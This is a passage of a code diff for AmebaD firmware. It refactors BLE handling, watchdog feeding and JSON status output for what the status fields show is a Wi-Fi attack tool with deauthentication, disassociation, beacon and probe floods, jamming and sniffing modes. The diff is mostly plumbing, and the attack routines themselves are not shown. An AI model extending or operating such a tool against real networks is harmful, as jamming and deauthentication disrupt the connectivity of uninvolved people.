+    uint8_t curTxPhy = 0, curRxPhy = 0;
+    le_get_conn_param(GAP_PARAM_CONN_TX_PHY_TYPE, &curTxPhy, snap.connId);
+    le_get_conn_param(GAP_PARAM_CONN_RX_PHY_TYPE, &curRxPhy, snap.connId);
+    if (curTxPhy == GAP_PHYS_2M || curRxPhy == GAP_PHYS_2M) {
+      T_GAP_CAUSE phyCause = le_set_phy(
+          snap.connId,
+          GAP_PHYS_PREFER_ALL,
+          GAP_PHYS_PREFER_1M_BIT,
+          GAP_PHYS_PREFER_1M_BIT,
+          GAP_PHYS_OPTIONS_CODED_PREFER_NO);
+      rtw_enter_critical(NULL, NULL);
+      bleGapDiag.phyReassertAttempts++;
+      bleGapDiag.phyReassertDone = true;
+      bleGapDiag.lastPhyReqMs = nowMs;
+      rtw_exit_critical(NULL, NULL);
+      char buf[96];
+      snprintf(buf, sizeof(buf),
+               "[BLE] Post-handshake 1M PHY re-suggest (1/1) from tx=%u/rx=%u cause=%d",
+               (unsigned)curTxPhy, (unsigned)curRxPhy, (int)phyCause);
+      Serial.println(buf);
     }
   }
 }
 
-void bleNotifCB(BLECharacteristic* /*chr*/, uint8_t connID, uint16_t cccd) {
-  activeConnId = connID;
-  bleNotifyEnabled = (cccd & GATT_CLIENT_CHAR_CONFIG_NOTIFY);
+void ensureBleAdvertisingIfDisconnected() {
+  static unsigned long lastAdvCheckMs = 0;
+  if (!bleStarted || bleAdvUpdateInProgress) return;
+  unsigned long nowMs = millis();
+  if (nowMs - lastAdvCheckMs < 1500) return;
+  lastAdvCheckMs = nowMs;
+
+  if (isBleConnectedSafe()) return;
+  T_GAP_DEV_STATE devState = {0, 0, 0, 0, 0};
+  le_get_gap_param(GAP_PARAM_DEV_STATE, &devState);
+  if (devState.gap_init_state == GAP_INIT_STATE_STACK_READY &&
+      devState.gap_adv_state == GAP_ADV_STATE_IDLE &&
+      devState.gap_conn_state == GAP_CONN_DEV_STATE_IDLE) {
+    le_adv_start();
+    Serial.println("[BLE] Restarted idle advertising.");
+  }
 }
 
 void updateBleName(const char *newName) {
@@ -1432,6 +2522,7 @@ void updateBleName(const char *newName) {
   strcpy(ble_name, nextName);
   if (!bleStarted) return;
 
+  bleAdvUpdateInProgress = true;
   BLE.setDeviceName(String(ble_name));
   char gapName[GAP_DEVICE_NAME_LEN] = {0};
   strncpy(gapName, ble_name, GAP_DEVICE_NAME_LEN - 1);
@@ -1439,14 +2530,15 @@ void updateBleName(const char *newName) {
   // 同步更新内置 GATT Device Name (0x2A00)，避免手机按 GATT 服务读取仍显示旧名
   gaps_set_parameter(GAPS_PARAM_DEVICE_NAME, (uint8_t)strlen(ble_name), (void *)ble_name);
 
-  // AmebaD GAP: 仅在 GAP_ADV_STATE_IDLE 下允许完整刷新广播参数；未连接在播时先停后启
+  // AmebaD GAP (#14): 先标记更新边界并停广播等待进入 IDLE，防止断连回调与参数更新竞态
   T_GAP_DEV_STATE devState = {0, 0, 0, 0, 0};
   le_get_gap_param(GAP_PARAM_DEV_STATE, &devState);
   bool wasAdvertising = (devState.gap_adv_state != GAP_ADV_STATE_IDLE);
   if (wasAdvertising) {
     le_adv_stop();
     unsigned long waitStart = millis();
-    while (devState.gap_adv_state != GAP_ADV_STATE_IDLE && (millis() - waitStart < 250)) {
+    while (devState.gap_adv_state != GAP_ADV_STATE_IDLE && (millis() - waitStart < 300)) {
+      feedWatchdog();
       delay(10);
       le_get_gap_param(GAP_PARAM_DEV_STATE, &devState);
     }
@@ -1457,12 +2549,22 @@ void updateBleName(const char *newName) {
   advdata.addCompleteName(ble_name);
   BLE.configAdvert()->setAdvData(advdata);
   BLE.configAdvert()->updateAdvertParams();
+  uint8_t all_phys = GAP_PHYS_PREFER_ALL;
+  uint8_t tx_phys = GAP_PHYS_PREFER_1M_BIT;
+  uint8_t rx_phys = GAP_PHYS_PREFER_1M_BIT;
+  le_set_gap_param(GAP_PARAM_DEFAULT_PHYS_PREFER, sizeof(all_phys), &all_phys);
+  le_set_gap_param(GAP_PARAM_DEFAULT_TX_PHYS_PREFER, sizeof(tx_phys), &tx_phys);
+  le_set_gap_param(GAP_PARAM_DEFAULT_RX_PHYS_PREFER, sizeof(rx_phys), &rx_phys);
   uint8_t slave_init_mtu_req = 1;
   le_set_gap_param(GAP_PARAM_SLAVE_INIT_GATT_MTU_REQ, sizeof(slave_init_mtu_req), &slave_init_mtu_req);
   le_adv_update_param();
+  delay(15);
 
-  if (wasAdvertising && !BLE.connected(activeConnId)) {
-    delay(20);
+  bleAdvUpdateInProgress = false;
+  le_get_gap_param(GAP_PARAM_DEV_STATE, &devState);
+  if (!isBleConnectedSafe() &&
+      devState.gap_adv_state == GAP_ADV_STATE_IDLE &&
+      devState.gap_conn_state == GAP_CONN_DEV_STATE_IDLE) {
     le_adv_start();
   }
 }
@@ -1495,36 +2597,123 @@ void setupBLE() {
   BLE.configServer(1);
   BLE.addService(UartService);
   BLE.beginPeripheral();
+  feedWatchdog();
+
+  // 1A: 显式锁定默认首选 1M PHY，提升接收灵敏度与 2.4GHz Wi-Fi 共存抗扰能力
+  uint8_t all_phys = GAP_PHYS_PREFER_ALL;
+  uint8_t tx_phys = GAP_PHYS_PREFER_1M_BIT;
+  uint8_t rx_phys = GAP_PHYS_PREFER_1M_BIT;
+  le_set_gap_param(GAP_PARAM_DEFAULT_PHYS_PREFER, sizeof(all_phys), &all_phys);
+  le_set_gap_param(GAP_PARAM_DEFAULT_TX_PHYS_PREFER, sizeof(tx_phys), &tx_phys);
+  le_set_gap_param(GAP_PARAM_DEFAULT_RX_PHYS_PREFER, sizeof(rx_phys), &rx_phys);
+
   // BLEAdvert::updateAdvertParams() 会在 beginPeripheral() 内重置 GAP_PARAM_SLAVE_INIT_GATT_MTU_REQ=false，
   // 必须在 beginPeripheral() 之后显式重新开启从机主动 MTU 协商请求（最大 247B）。
   uint8_t slave_init_mtu_req = 1;
   le_set_gap_param(GAP_PARAM_SLAVE_INIT_GATT_MTU_REQ, sizeof(slave_init_mtu_req), &slave_init_mtu_req);
+
+  // 1-OptB: 通过合法 SDK 接口将 GAP 状态消息导流至 appGapCallback 以采集诊断并执行协商
+  le_gap_msg_info_way(false);
+  le_register_app_cb(appGapCallback);
+
   bleStarted = true;
-  Serial.println("[INFO] BLE UART service started (" + String(ble_name) + ")");
+  Serial.print("[INFO] BLE UART service started (");
+  Serial.print(ble_name);
+  Serial.println(")");
+}
+
+void cancelBleScanPush() {
+  bleScanPush.reset();
+}
+
+void pumpBleScanPush() {
+  if (!bleScanPush.active) return;
+  uint8_t connId = 0;
+  if (!isBleReadyToNotifySafe(connId)) {
+    cancelBleScanPush();
+    return;
+  }
+  unsigned long nowMs = millis();
+  if (nowMs - bleScanPush.lastProgressAt > 8000) {
+    Serial.println("[BLE] Aborted stalled scan result push.");
+    cancelBleScanPush();
+    return;
+  }
+
+  const uint8_t MAX_LINES_PER_TICK = 4;
+  uint8_t sentCount = 0;
+  while (sentCount < MAX_LINES_PER_TICK) {
+    if (!hasBleTxCreditHeadroom(connId, 2, 0)) {
+      break;
+    }
+    if (!bleScanPush.beginSent) {
+      const char *beginMsg = bleScanPush.isSync ? "{\"t\":\"sync_begin\"}" : "{\"t\":\"scan_begin\"}";
+      if (!bleSendLineCstr(beginMsg, strlen(beginMsg), true, false)) {
+        break;
+      }
+      bleScanPush.beginSent = true;
+      bleScanPush.lastProgressAt = millis();
+      sentCount++;
+      continue;
+    }
+
+    if (bleScanPush.idx < bleScanPush.snap.size()) {
+      const WiFiScanResult &ap = bleScanPush.snap[bleScanPush.idx];
+      char escSsid[140];
+      jsonEscapeTruncatedToBuf(ap.ssid.c_str(), escSsid, sizeof(escSsid), 96, "...");
+      char line[256];
+      int n = snprintf(line, sizeof(line),
+                       "{\"t\":\"ap\",\"i\":%lu,\"s\":\"%s\",\"b\":\"%s\",\"c\":%u,\"r\":%d%s}",
+                       (unsigned long)bleScanPush.idx,
+                       escSsid,
+                       ap.bssid_str.c_str(),
+                       (unsigned)ap.channel,
+                       (int)ap.rssi,
+                       ap.selected ? ",\"sel\":1" : "");
+      if (n > 0 && (size_t)n < sizeof(line)) {
+        if (!bleSendLineCstr(line, (size_t)n, true, false)) {
+          break;
+        }
+      }
+      bleScanPush.idx++;
+      bleScanPush.lastProgressAt = millis();
+      sentCount++;
+    } else {
+      char endLine[48];
+      int n = snprintf(endLine, sizeof(endLine),
+                       bleScanPush.isSync ? "{\"t\":\"sync_end\",\"n\":%lu}" : "{\"t\":\"scan_end\",\"n\":%lu}",
+                       (unsigned long)bleScanPush.snap.size());
+      if (n > 0 && (size_t)n < sizeof(endLine)) {
+        if (!bleSendLineCstr(endLine, (size_t)n, true, false)) {
+          break;
+        }
+      }
+      cancelBleScanPush();
+      break;
+    }
+  }
 }
 
 void blePushScanResults(bool emitBegin, bool isSync) {
-  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
-  std::vector<WiFiScanResult> snap = snapshotScanResults();
-  if (emitBegin) {
-    bleSendLine(isSync ? "{\"t\":\"sync_begin\"}" : "{\"t\":\"scan_begin\"}");
+  uint8_t connId = 0;
+  if (!isBleReadyToNotifySafe(connId)) {
+    cancelBleScanPush();
+    return;
   }
-  for (size_t i = 0; i < snap.size(); i++) {
-    String escapedSsid = jsonEscapeTruncated(snap[i].ssid, 96, "...");
-    String line = "{\"t\":\"ap\",\"i\":" + String(i) +
-                  ",\"s\":\"" + escapedSsid + "\"" +
-                  ",\"b\":\"" + snap[i].bssid_str + "\"" +
-                  ",\"c\":" + String(snap[i].channel) +
-                  ",\"r\":" + String(snap[i].rssi);
-    if (snap[i].selected) line += ",\"sel\":1";
-    line += "}";
-    bleSendLine(line);
-  }
-  bleSendLine(String(isSync ? "{\"t\":\"sync_end\",\"n\":" : "{\"t\":\"scan_end\",\"n\":") + String(snap.size()) + "}");
+  bleScanPush.reset();
+  bleScanPush.snap = snapshotScanResults();
+  bleScanPush.active = true;
+  bleScanPush.emitBegin = emitBegin;
+  bleScanPush.isSync = isSync;
+  bleScanPush.beginSent = !emitBegin;
+  bleScanPush.idx = 0;
+  bleScanPush.lastProgressAt = millis();
+  pumpBleScanPush();
 }
 
-void blePushStatus() {
-  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
+void blePushStatus(bool critical) {
+  uint8_t connId = 0;
+  if (!isBleReadyToNotifySafe(connId)) return;
   unsigned long remSec = 0;
   unsigned long nowMs = millis();
   if (timedAttackEnabled && (nowMs - attackStartTime < attackDuration)) {
@@ -1543,44 +2732,55 @@ void blePushStatus() {
   chSnap = currentChannel;
   rtw_exit_critical(NULL, NULL);
 
-  String line = "{\"t\":\"st\"";
-  line += ",\"atk\":" + String(attack_enabled ? 1 : 0);
-  line += ",\"dis\":" + String(disassoc_enabled ? 1 : 0);
-  line += ",\"bcn\":" + String(beacon_flood_enabled ? 1 : 0);
-  line += ",\"prb\":" + String(probe_flood_enabled ? 1 : 0);
-  line += ",\"jam\":" + String(signal_jam_enabled ? 1 : 0);
-  line += ",\"snf\":" + String(deauthSniffSnap ? 1 : 0);
-  line += ",\"snfOn\":" + String(sniffingSnap ? 1 : 0);
-  line += ",\"sMode\":" + String((int)modeSnap);
-  line += ",\"hop\":" + String(isHopping ? 1 : 0);
-  line += ",\"ch\":" + String(chSnap);
-  line += ",\"ok\":" + String(tx_success_count);
-  line += ",\"fail\":" + String(tx_fail_count);
-  line += ",\"rem\":" + String(remSec);
-  line += "}";
-  bleSendLine(line);
+  char line[224];
+  int n = snprintf(line, sizeof(line),
+                   "{\"t\":\"st\",\"atk\":%d,\"dis\":%d,\"bcn\":%d,\"prb\":%d,\"jam\":%d,\"snf\":%d,\"snfOn\":%d,\"sMode\":%d,\"hop\":%d,\"ch\":%d,\"ok\":%lu,\"fail\":%lu,\"rem\":%lu}",
+                   attack_enabled ? 1 : 0,
+                   disassoc_enabled ? 1 : 0,
+                   beacon_flood_enabled ? 1 : 0,
+                   probe_flood_enabled ? 1 : 0,
+                   signal_jam_enabled ? 1 : 0,
+                   deauthSniffSnap ? 1 : 0,
+                   sniffingSnap ? 1 : 0,
+                   (int)modeSnap,
+                   isHopping ? 1 : 0,
+                   chSnap,
+                   (unsigned long)tx_success_count,
+                   (unsigned long)tx_fail_count,
+                   remSec);
+  if (n > 0 && (size_t)n < sizeof(line)) {
+    bleSendLineCstr(line, (size_t)n, critical, !critical);
+  }
 }
 
 void blePushInfo() {
-  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
-  String line = "{\"t\":\"cfg\"";
-  line += ",\"delay\":" + String(cycle_delay);
-  line += ",\"scan\":" + String(scan_time);
-  line += ",\"frames\":" + String(num_send_frames);
-  line += ",\"ch\":" + String(start_channel);
-  line += ",\"sc\":" + String(scan_between_cycles ? 1 : 0);
-  line += ",\"led\":" + String(USE_LED ? 1 : 0);
-  line += ",\"ap\":" + String(apEnabled ? 1 : 0);
-  line += "}";
-  bleSendLine(line);
+  uint8_t connId = 0;
+  if (!isBleReadyToNotifySafe(connId)) return;
+  char cfgLine[160];
+  int cn = snprintf(cfgLine, sizeof(cfgLine),
+                    "{\"t\":\"cfg\",\"delay\":%lu,\"scan\":%lu,\"frames\":%lu,\"ch\":%d,\"sc\":%d,\"led\":%d,\"ap\":%d}",
+                    cycle_delay,
+                    scan_time,
+                    num_send_frames,
+                    start_channel,
+                    scan_between_cycles ? 1 : 0,
+                    USE_LED ? 1 : 0,
+                    apEnabled ? 1 : 0);
+  if (cn > 0 && (size_t)cn < sizeof(cfgLine)) {
+    bleSendLineCstr(cfgLine, (size_t)cn, true, false);
+  }
 
   // 动态 MTU 分片模式下固定发送单行完整 id（含 ssid/pass/ble），消除 Android 半同步写入旧值风险
-  String idLine = "{\"t\":\"id\"";
-  idLine += ",\"ssid\":\"" + jsonEscape(String(ap_ssid)) + "\"";
-  idLine += ",\"pass\":\"" + jsonEscape(String(ap_pass)) + "\"";
-  idLine += ",\"ble\":\"" + jsonEscape(String(ble_name)) + "\"";
-  idLine += "}";
-  bleSendLine(idLine);
+  char escSsid[80], escPass[144], escBle[64], idLine[340];
+  jsonEscapeToBuf(ap_ssid, escSsid, sizeof(escSsid));
+  jsonEscapeToBuf(ap_pass, escPass, sizeof(escPass));
+  jsonEscapeToBuf(ble_name, escBle, sizeof(escBle));
+  int in = snprintf(idLine, sizeof(idLine),
+                    "{\"t\":\"id\",\"ssid\":\"%s\",\"pass\":\"%s\",\"ble\":\"%s\"}",
+                    escSsid, escPass, escBle);
+  if (in > 0 && (size_t)in < sizeof(idLine)) {
+    bleSendLineCstr(idLine, (size_t)in, true, false);
+  }
 }
 
 //==========================================================
@@ -1855,11 +3055,14 @@ int scanNetworks(bool emitBegin, bool isSync) {
     // Wait for the driver to signal scan completion, using scan_time only as
     // a maximum-timeout guard so we never block forever.
     unsigned long start = millis();
+    feedWatchdog();
     while (!scan_done && (millis() - start < scan_time)) {
+      feedWatchdog();
       pollSerialInput();
       if (emergencyStopRequested || priorityStopPending) break;
       delay(50);
     }
+    feedWatchdog();
     // 在 scanMutex 保护下关闭写入窗口、排序并同步选中目标，杜绝与延迟到达回调并发写 vector
     if (lockScanMutex()) {
       scan_accepting = false;
@@ -1897,7 +3100,7 @@ void printScanResults() {
   std::vector<WiFiScanResult> snap = snapshotScanResults();
   Serial.println("Detected networks:");
   for (size_t i = 0; i < snap.size(); i++) {
-    String freq = (snap[i].channel >= 36) ? "5GHz" : "2.4GHz";
+    const char *freq = (snap[i].channel >= 36) ? "5GHz" : "2.4GHz";
     Serial.print(i);
     Serial.print("\tSSID: ");
     Serial.print(snap[i].ssid);
@@ -1937,11 +3140,12 @@ void checkTimedAttack() {
     timedSniffEnabled = false;
     stopSniffing();
     blePushStatus();
-    Serial.println("[INFO] Timed sniff ended, SoftAP restored.");
+    Serial.println("[INFO] Timed sniff ended.");
   }
 }
 
 bool shouldAbortCycle() {
+  feedWatchdog();
   if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
     return true;
   }
@@ -1960,85 +3164,27 @@ bool shouldAbortCycle() {
 // JSON Builders
 //==========================================================
 String jsonEscapeTruncated(const String &s, size_t maxEscapedBytes, const char *ellipsis) {
-  String out;
   size_t len = s.length();
-  if (len == 0 || maxEscapedBytes == 0) return out;
-  size_t reserveLen = len + 16;
-  if (maxEscapedBytes != (size_t)-1 && reserveLen > maxEscapedBytes) {
-    reserveLen = maxEscapedBytes;
+  if (len == 0 || maxEscapedBytes == 0) return "";
+  size_t bufCap = len * 6 + 16;
+  if (maxEscapedBytes != (size_t)-1 && bufCap > maxEscapedBytes + 8) {
+    bufCap = maxEscapedBytes + 8;
   }
-  out.reserve(reserveLen);
-
-  size_t ellLen = (ellipsis != nullptr) ? strlen(ellipsis) : 0;
-  if (maxEscapedBytes != (size_t)-1 && ellLen > maxEscapedBytes) {
-    ellLen = 0;
+  if (bufCap <= 384) {
+    char stackBuf[384];
+    jsonEscapeTruncatedToBuf(s.c_str(), stackBuf, sizeof(stackBuf), maxEscapedBytes, ellipsis);
+    return String(stackBuf);
   }
-
-  const uint8_t *data = (const uint8_t *)s.c_str();
-  size_t i = 0;
-  size_t lastEllipsisCut = 0;
-  bool truncated = false;
-
-  while (i < len) {
-    uint8_t c = data[i];
-    if (c == 0x00) {
-      i++;
-      continue;
-    }
-
-    char seqBuf[8];
-    size_t seqLen = 0;
-    size_t consume = 1;
-
-    if (c == '"') {
-      seqBuf[0] = '\\'; seqBuf[1] = '"'; seqLen = 2;
-    } else if (c == '\\') {
-      seqBuf[0] = '\\'; seqBuf[1] = '\\'; seqLen = 2;
-    } else if (c == '\b') {
-      seqBuf[0] = '\\'; seqBuf[1] = 'b'; seqLen = 2;
-    } else if (c == '\f') {
-      seqBuf[0] = '\\'; seqBuf[1] = 'f'; seqLen = 2;
-    } else if (c == '\n') {
-      seqBuf[0] = '\\'; seqBuf[1] = 'n'; seqLen = 2;
-    } else if (c == '\r') {
-      seqBuf[0] = '\\'; seqBuf[1] = 'r'; seqLen = 2;
-    } else if (c == '\t') {
-      seqBuf[0] = '\\'; seqBuf[1] = 't'; seqLen = 2;
-    } else if (c < 0x20 || c == 0x7F) {
-      snprintf(seqBuf, sizeof(seqBuf), "\\u%04x", (unsigned)c);
-      seqLen = 6;
-    } else if (c < 0x80) {
-      seqBuf[0] = (char)c;
-      seqLen = 1;
-    } else {
-      size_t utf8Len = validUtf8CharLen(&data[i], len - i);
-      if (utf8Len > 0 && utf8Len <= 4) {
-        memcpy(seqBuf, &data[i], utf8Len);
-        seqLen = utf8Len;
-        consume = utf8Len;
-      } else {
-        seqBuf[0] = '?';
-        seqLen = 1;
-        consume = 1;
-      }
-    }
-
-    seqBuf[seqLen] = '\0';
-    if (maxEscapedBytes != (size_t)-1 && (out.length() + seqLen > maxEscapedBytes)) {
-      truncated = true;
-      break;
-    }
-    out += seqBuf;
-    if (maxEscapedBytes != (size_t)-1 && (out.length() + ellLen <= maxEscapedBytes)) {
-      lastEllipsisCut = out.length();
-    }
-    i += consume;
+  char *dynBuf = (char *)malloc(bufCap);
+  if (!dynBuf) {
+    char fallbackBuf[384];
+    jsonEscapeTruncatedToBuf(s.c_str(), fallbackBuf, sizeof(fallbackBuf),
+                             (maxEscapedBytes < 380) ? maxEscapedBytes : 380, ellipsis);
+    return String(fallbackBuf);
   }
-
-  if (truncated && ellLen > 0) {
-    out.remove((unsigned int)lastEllipsisCut);
-    out += ellipsis;
-  }
+  jsonEscapeTruncatedToBuf(s.c_str(), dynBuf, bufCap, maxEscapedBytes, ellipsis);
+  String out(dynBuf);
+  free(dynBuf);
   return out;
 }
 
@@ -2049,19 +3195,25 @@ String jsonEscape(const String &s) {
 String getScanResultsJSON() {
   std::vector<WiFiScanResult> snap = snapshotScanResults();
   String json;
-  json.reserve(64 + snap.size() * 140);
-  json = "{\"count\":" + String(snap.size()) + ",\"networks\":[";
+  json.reserve(64 + snap.size() * 144);
+  char headBuf[48];
+  snprintf(headBuf, sizeof(headBuf), "{\"count\":%lu,\"networks\":[", (unsigned long)snap.size());
+  json = headBuf;
   for (size_t i = 0; i < snap.size(); i++) {
-    if (i) json += ",";
-    json += "{";
-    json += "\"index\":" + String(i) + ",";
-    json += "\"ssid\":\"" + jsonEscape(snap[i].ssid) + "\",";
-    json += "\"bssid\":\"" + snap[i].bssid_str + "\",";
-    json += "\"channel\":" + String(snap[i].channel) + ",";
-    json += "\"rssi\":" + String(snap[i].rssi) + ",";
-    json += "\"band\":\"" + String((snap[i].channel >= 36) ? "5GHz" : "2.4GHz") + "\",";
-    json += "\"selected\":" + String(snap[i].selected ? "true" : "false");
-    json += "}";
+    char escSsid[200];
+    jsonEscapeToBuf(snap[i].ssid.c_str(), escSsid, sizeof(escSsid));
+    char itemBuf[320];
+    snprintf(itemBuf, sizeof(itemBuf),
+             "%s{\"index\":%lu,\"ssid\":\"%s\",\"bssid\":\"%s\",\"channel\":%u,\"rssi\":%d,\"band\":\"%s\",\"selected\":%s}",
+             (i > 0) ? "," : "",
+             (unsigned long)i,
+             escSsid,
+             snap[i].bssid_str.c_str(),
+             (unsigned)snap[i].channel,
+             (int)snap[i].rssi,
+             (snap[i].channel >= 36) ? "5GHz" : "2.4GHz",
+             snap[i].selected ? "true" : "false");
+    json += itemBuf;
   }
   json += "]}";
   return json;
@@ -2081,64 +3233,81 @@ String getStatusJSON() {
   deauthSniffSnap = deauth_sniff_enabled;
   chSnap = currentChannel;
   rtw_exit_critical(NULL, NULL);
+  bool bleConnectedSnap = isBleConnectedSafe();
 
-  String json;
-  json.reserve(512);
-  json = "{";
-  json += "\"attack_enabled\":" + String(attack_enabled ? "true" : "false") + ",";
-  json += "\"disassoc_enabled\":" + String(disassoc_enabled ? "true" : "false") + ",";
-  json += "\"timed_attack\":" + String(timedAttackEnabled ? "true" : "false") + ",";
-  json += "\"timed_sniff\":" + String(timedSniffEnabled ? "true" : "false") + ",";
-  json += "\"sniffing\":" + String(sniffingSnap ? "true" : "false") + ",";
-  json += "\"hopping\":" + String(isHopping ? "true" : "false") + ",";
-  json += "\"target_mode\":" + String(targetModeSnap ? "true" : "false") + ",";
-  json += "\"scan_count\":" + String(scanCount) + ",";
-  json += "\"target_count\":" + String(targetCount) + ",";
-  json += "\"current_channel\":" + String(chSnap) + ",";
-  json += "\"beacon_flood\":" + String(beacon_flood_enabled ? "true" : "false") + ",";
-  json += "\"probe_flood\":" + String(probe_flood_enabled ? "true" : "false") + ",";
-  json += "\"signal_jam\":" + String(signal_jam_enabled ? "true" : "false") + ",";
-  json += "\"deauth_sniff\":" + String(deauthSniffSnap ? "true" : "false") + ",";
-  json += "\"tx_ok\":" + String(tx_success_count) + ",";
-  json += "\"tx_fail\":" + String(tx_fail_count) + ",";
-  json += "\"ssid\":\"" + jsonEscape(String(ap_ssid)) + "\",";
-  json += "\"ble_name\":\"" + jsonEscape(String(ble_name)) + "\",";
-  json += "\"ap_enabled\":" + String(apEnabled ? "true" : "false") + ",";
+  char escSsid[80], escBle[64];
+  jsonEscapeToBuf(ap_ssid, escSsid, sizeof(escSsid));
+  jsonEscapeToBuf(ble_name, escBle, sizeof(escBle));
+
+  char remField[48] = "";
+  unsigned long nowMs = millis();
   if (timedAttackEnabled) {
-    unsigned long elapsed = millis() - attackStartTime;
+    unsigned long elapsed = nowMs - attackStartTime;
     unsigned long remaining = (attackDuration > elapsed) ? (attackDuration - elapsed) : 0;
-    json += "\"timed_remaining\":" + String(remaining) + ",";
+    snprintf(remField, sizeof(remField), "\"timed_remaining\":%lu,", remaining);
   } else if (timedSniffEnabled) {
-    unsigned long elapsed = millis() - sniffStartTime;
+    unsigned long elapsed = nowMs - sniffStartTime;
     unsigned long remaining = (sniffDuration > elapsed) ? (sniffDuration - elapsed) : 0;
-    json += "\"timed_remaining\":" + String(remaining) + ",";
+    snprintf(remField, sizeof(remField), "\"timed_remaining\":%lu,", remaining);
   }
-  json += "\"uptime\":" + String(millis());
-  json += "}";
-  return json;
+
+  char buf[768];
+  snprintf(buf, sizeof(buf),
+           "{\"attack_enabled\":%s,\"disassoc_enabled\":%s,\"timed_attack\":%s,\"timed_sniff\":%s,"
+           "\"sniffing\":%s,\"hopping\":%s,\"target_mode\":%s,\"scan_count\":%lu,\"target_count\":%lu,"
+           "\"current_channel\":%d,\"beacon_flood\":%s,\"probe_flood\":%s,\"signal_jam\":%s,"
+           "\"deauth_sniff\":%s,\"tx_ok\":%lu,\"tx_fail\":%lu,\"ssid\":\"%s\",\"ble_name\":\"%s\","
+           "\"ap_enabled\":%s,\"ble_connected\":%s,%s\"uptime\":%lu}",
+           attack_enabled ? "true" : "false",
+           disassoc_enabled ? "true" : "false",
+           timedAttackEnabled ? "true" : "false",
+           timedSniffEnabled ? "true" : "false",
+           sniffingSnap ? "true" : "false",
+           isHopping ? "true" : "false",
+           targetModeSnap ? "true" : "false",
+           (unsigned long)scanCount,
+           (unsigned long)targetCount,
+           chSnap,
+           beacon_flood_enabled ? "true" : "false",
+           probe_flood_enabled ? "true" : "false",
+           signal_jam_enabled ? "true" : "false",
+           deauthSniffSnap ? "true" : "false",
+           (unsigned long)tx_success_count,
+           (unsigned long)tx_fail_count,
+           escSsid,
+           escBle,
+           apEnabled ? "true" : "false",
+           bleConnectedSnap ? "true" : "false",
+           remField,
+           nowMs);
+  return String(buf);
 }
 
 String getInfoJSON() {
-  String json;
-  json.reserve(320);
-  json = "{";
-  json += "\"cycle_delay\":" + String(cycle_delay) + ",";
-  json += "\"scan_time\":" + String(scan_time) + ",";
-  json += "\"num_frames\":" + String(num_send_frames) + ",";
-  json += "\"start_channel\":" + String(start_channel) + ",";
-  json += "\"scan_between_cycles\":" + String(scan_between_cycles ? "true" : "false") + ",";
-  json += "\"led\":" + String(USE_LED ? "true" : "false") + ",";
-  json += "\"ssid\":\"" + jsonEscape(String(ap_ssid)) + "\",";
+  char escSsid[80], escBle[64];
+  jsonEscapeToBuf(ap_ssid, escSsid, sizeof(escSsid));
+  jsonEscapeToBuf(ble_name, escBle, sizeof(escBle));
+
   // 决策 C：HTTP /api/info 不返回明文 ap_pass，仅留空提示未修改
-  json += "\"pass\":\"\",";
-  json += "\"ble_name\":\"" + jsonEscape(String(ble_name)) + "\",";
-  json += "\"channel\":" + String(WIFI_CHANNEL);
-  json += "}";
-  return json;
+  char buf[448];
+  snprintf(buf, sizeof(buf),
+           "{\"cycle_delay\":%lu,\"scan_time\":%lu,\"num_frames\":%lu,\"start_channel\":%d,"
+           "\"scan_between_cycles\":%s,\"led\":%s,\"ssid\":\"%s\",\"pass\":\"\",\"ble_name\":\"%s\",\"channel\":%d}",
+           cycle_delay,
+           scan_time,
+           num_send_frames,
+           start_channel,
+           scan_between_cycles ? "true" : "false",
+           USE_LED ? "true" : "false",
+           escSsid,
+           escBle,
+           WIFI_CHANNEL);
+  return String(buf);
 }
 
 String getLogsJSON() {
-  char logSnapshot[WEB_LOG_HISTORY_SIZE][LOG_STR_LEN];
+  // Allocate transient snapshot on heap (zero static .bss footprint, zero 4KB main_task stack bloat)
+  char *logSnapshot = (char *)malloc((size_t)WEB_LOG_HISTORY_SIZE * LOG_STR_LEN);
   uint8_t count = 0;
   bool sniffingSnap = false;
   SniffMode modeSnap = SNIFF_STOP;
@@ -2151,26 +3320,42 @@ String getLogsJSON() {
   modeSnap = currentMode;
   hoppingSnap = isHopping;
   chSnap = currentChannel;
-  count = webLogCount;
-  if (count > WEB_LOG_HISTORY_SIZE) count = WEB_LOG_HISTORY_SIZE;
-  uint8_t startIdx = (webLogHead + WEB_LOG_HISTORY_SIZE - count) % WEB_LOG_HISTORY_SIZE;
-  for (uint8_t i = 0; i < count; i++) {
-    uint8_t slot = (startIdx + i) % WEB_LOG_HISTORY_SIZE;
-    strncpy(logSnapshot[i], webLogHistory[slot], LOG_STR_LEN - 1);
-    logSnapshot[i][LOG_STR_LEN - 1] = '\0';
+  if (logSnapshot != nullptr) {
+    count = webLogCount;
+    if (count > WEB_LOG_HISTORY_SIZE) count = WEB_LOG_HISTORY_SIZE;
+    uint8_t startIdx = (webLogHead + WEB_LOG_HISTORY_SIZE - count) % WEB_LOG_HISTORY_SIZE;
+    for (uint8_t i = 0; i < count; i++) {
+      uint8_t slot = (startIdx + i) % WEB_LOG_HISTORY_SIZE;
+      char *dst = logSnapshot + ((size_t)i * LOG_STR_LEN);
+      size_t cp = strlen(webLogHistory[slot]) + 1;
+      if (cp > LOG_STR_LEN) cp = LOG_STR_LEN;
+      memcpy(dst, webLogHistory[slot], cp);
+      dst[LOG_STR_LEN - 1] = '\0';
+    }
   }
   rtw_exit_critical(NULL, NULL);
 
   String json;
-  json.reserve(128 + (size_t)count * 144);
-  json = "{\"sniffing\":" + String(sniffingSnap ? "true" : "false") +
-         ",\"mode\":" + String((int)modeSnap) +
-         ",\"hopping\":" + String(hoppingSnap ? "true" : "false") +
-         ",\"channel\":" + String(chSnap) +
-         ",\"logs\":[";
+  json.reserve(96 + (size_t)count * 160);
+  char hdrBuf[96];
+  snprintf(hdrBuf, sizeof(hdrBuf),
+           "{\"sniffing\":%s,\"mode\":%d,\"hopping\":%s,\"channel\":%d,\"logs\":[",
+           sniffingSnap ? "true" : "false",
+           (int)modeSnap,
+           hoppingSnap ? "true" : "false",
+           chSnap);
+  json = hdrBuf;
   for (uint8_t i = 0; i < count; i++) {
+    char escLog[256];
+    const char *src = logSnapshot + ((size_t)i * LOG_STR_LEN);
+    jsonEscapeToBuf(src, escLog, sizeof(escLog));
     if (i > 0) json += ",";
-    json += "\"" + jsonEscape(String(logSnapshot[i])) + "\"";
+    json += "\"";
+    json += escLog;
+    json += "\"";
+  }
+  if (logSnapshot != nullptr) {
+    free(logSnapshot);
   }
   json += "]}";
